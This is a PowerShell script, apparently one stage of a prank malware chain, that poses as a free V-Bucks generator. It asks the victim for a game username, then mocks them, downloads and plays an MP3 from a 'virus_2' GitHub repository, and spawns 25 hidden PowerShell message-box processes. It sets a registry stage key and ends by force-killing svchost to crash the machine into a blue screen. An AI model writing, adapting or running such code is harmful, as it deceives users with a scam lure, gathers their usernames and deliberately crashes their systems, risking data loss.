Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName Microsoft.VisualBasic
Add-Type -AssemblyName PresentationCore

$voice = New-Object System.Speech.Synthesis.SpeechSynthesizer

# 1. Dialog Sequence
$voice.Speak("hello user you want vbucks right just type your username in the message box and then click enter")
[Microsoft.VisualBasic.Interaction]::InputBox("Enter Username:", "V-Bucks Generator", "")

$voice.Speak("how much vbucks do you want?")
[Microsoft.VisualBasic.Interaction]::InputBox("Enter Amount:", "V-Bucks Generator", "13500")

$voice.Speak("you been fooled")

# 2. Download the MP3
$mp3Url = "https://github.com/DanielNov2014/virus_2/raw/refs/heads/main/resources/you-been-trolled.mp3"
$mp3Path = "$env:TEMP\troll.mp3"
Invoke-WebRequest -Uri $mp3Url -OutFile $mp3Path

# 3. Play Music using PresentationCore Logic
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.Open($mp3Path)
$mediaPlayer.Volume = 1.0 # Set volume to max (0.0 to 1.0)
$mediaPlayer.Play()

# IMPORTANT: We must wait for the audio to finish. 
# If the script continues to the BSOD immediately, you won't hear anything.
Start-Sleep -Seconds 25 

# 4. Spam Message Boxes
for ($i = 0; $i -lt 25; $i++) {
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('YOU BEEN TROLLED', 'LOL')"
}

Start-Sleep -Seconds 2

# 5. Increment Stage in Registry
$Key = "HKCU:\Software\Freevbucks"
if (Test-Path $Key) {
    Set-ItemProperty -Path $Key -Name "Stage" -Value 3
}

# 6. Blue Screen (BSOD) - Triggers the crash
Stop-Process -Name svchost -Force
